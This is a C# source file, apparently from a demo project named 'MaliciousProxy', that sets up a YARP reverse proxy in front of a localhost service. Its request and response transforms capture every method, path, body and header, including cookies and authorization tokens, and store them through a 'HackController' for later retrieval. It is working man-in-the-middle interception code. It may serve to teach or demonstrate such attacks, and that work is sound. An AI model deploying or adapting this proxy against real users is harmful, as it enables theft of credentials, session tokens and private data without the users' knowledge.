using MaliciousProxy.Controllers;
using System.Text;
using Yarp.ReverseProxy.Configuration;
using Yarp.ReverseProxy.Transforms;

namespace MaliciousProxy;

public class Program
{
    public static void Main(string[] args)
    {
        var builder = WebApplication.CreateBuilder(args);

        // Add services to the container.

        builder.Services.AddControllers();

        builder.Services.AddReverseProxy()
            .LoadFromMemory(new RouteConfig[]
            {
                new()
                {
                    RouteId = "route1",
                    ClusterId = "cluster1",
                    Match = new RouteMatch
                    {
                        Path = "{**all}"
                    }
                }
            }, new ClusterConfig[]
            {
                new()
                {
                    ClusterId = "cluster1",
                    Destinations = new Dictionary<string, DestinationConfig>(StringComparer.OrdinalIgnoreCase)
                    {
                        { "destination1", new DestinationConfig { Address = "https://localhost:7246" } },
                    }
                }
            }).AddTransforms(builderContext =>
            {
                builderContext.AddRequestTransform(async context =>
                {
                    HttpRequest request = context.HttpContext.Request;
                    HackController.AddData($"{request.Method} {request.Path}");
                    string body = Encoding.UTF8.GetString((await request.BodyReader.ReadAsync()).Buffer);
                    if (!string.IsNullOrEmpty(body))
                    {
                        HackController.AddData($"BODY {body}");
                    }

                    foreach (var header in request.Headers)
                    {
                        HackController.AddData($"HEADER {header.Key}:{string.Join(",", header.Value)}");
                    }
                });
                builderContext.AddResponseTransform(async context =>
                {
                    var response = context.ProxyResponse;
                    if (response == null)
                    {
                        HackController.AddData("RESPONSE NULL");
                        return;
                    }

                    HackController.AddData($"RESPONSE {response.StatusCode}");
                    string body = await response.Content.ReadAsStringAsync();
                    if (!string.IsNullOrEmpty(body))
                    {
                        HackController.AddData($"BODY {body}");
                    }
                    foreach (var header in response.Headers)
                    {
                        HackController.AddData($"HEADER {header.Key}:{string.Join(",", header.Value)}");
                    }
                });
            });

        var app = builder.Build();

        // Configure the HTTP request pipeline.

        app.UseHttpsRedirection();

        app.UseAuthorization();

        app.MapReverseProxy();

        app.MapControllers();

        app.Run();
    }
}
